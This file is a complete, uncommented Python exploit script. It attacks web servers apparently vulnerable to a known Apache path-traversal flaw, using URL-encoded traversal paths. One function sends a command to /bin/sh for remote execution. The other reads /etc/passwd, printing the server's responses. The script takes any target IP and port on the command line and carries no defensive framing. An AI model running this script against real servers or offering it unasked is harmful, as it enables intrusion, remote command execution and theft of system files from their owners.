import requests
import sys

def exploit_command_execution(target):
    url = f"{target}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
    data = "echo;id"

    print("[*] Trying command execution...")
    response = requests.post(url, data=data)

    if response.status_code == 200:
        print("[+] Command execution successful!")
        print(response.text)
    else:
        print(f"[-] Command execution failed with status code: {response.status_code}")

def exploit_file_read(target):
    url = f"{target}/icons/.%2e%2e/%2e%2e/%2e%2e/etc/passwd"

    print("[*] Trying file read (/etc/passwd)...")
    response = requests.get(url)

    if response.status_code == 200:
        print("[+] File read successful!")
        print(response.text)
    else:
        print(f"[-] File read failed with status code: {response.status_code}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <TARGET_IP:PORT>")
        print(f"Example: python3 {sys.argv[0]} 192.168.0.10:8080")
        sys.exit(1)

    ip_port = sys.argv[1]
    target = f"http://{ip_port}"

    exploit_command_execution(target)
    print("\n" + "="*50 + "\n")
    exploit_file_read(target)

